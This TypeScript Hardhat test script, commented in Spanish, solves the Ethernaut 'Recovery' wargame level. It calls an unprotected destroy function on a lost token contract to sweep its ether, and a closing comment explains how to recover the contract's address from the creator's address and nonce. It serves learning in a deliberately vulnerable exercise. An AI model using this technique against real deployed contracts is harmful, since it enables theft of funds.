import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let token: Contract;
let libraryMaliciosa: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2";
const INSTANCIA_DEL_NIVEL: string = "0xB3aCBd75c2Ee9227F6a2063ea629de05b89852d9";
const INSTANCIA_DEL_TOKEN: string = "0xC6E0C63D087b9Dbc890541f47a098A43660c582F";
// const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Recovery`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  // Contrato del token creado
  const tokenFactory = await ethers.getContractFactory(`SimpleToken`);
  token = await tokenFactory.attach(INSTANCIA_DEL_TOKEN);
  console.log(`CONTRATO DEL TOKEN TOMADO DESDE :`, token.address);

  // // Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`PreservationAttacker`);
  // attacker = await attackerFactory.deploy(challenge.address, libraryMaliciosa.address);
  // await attacker.deployed();
  // console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Recovery Challenge", async()=> {
  it("Resuelve el challenge - Recovery", async()=>{
    console.log(`EL BALANCE DEL CONTRATO TOKEN ES: ${await token.provider.getBalance(token.address)}`);
    const eoaAddress = await eoa.getAddress();
    let txDestroy = await token.destroy(eoaAddress);
    await txDestroy.wait();
    console.log(`EL BALANCE DEL CONTRATO TOKEN POST DESTROY ES: ${await token.provider.getBalance(token.address)}`);
    expect(await token.provider.getBalance(token.address), "BALANCE DEL CONTRATO TOKEN AUN CON SALDO").to.eq(0);
  });
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

//Resulta sencillo resolver este challenge si utilizamos un explorador de bloques como https://rinkeby.etherscan.io, aunque también tenemos que tener en cuenta que el address del contrato SimplyToken también puede buscarse sabiendo que la misma se genera usando keccak256(address,nonce), siendo el address la dirección que creó la transacción y el nonce la cantidad de contratos que creó ese contrato (para este caso, ya que recordemos que el nonce aumenta con todas las transacciones que se realicen). 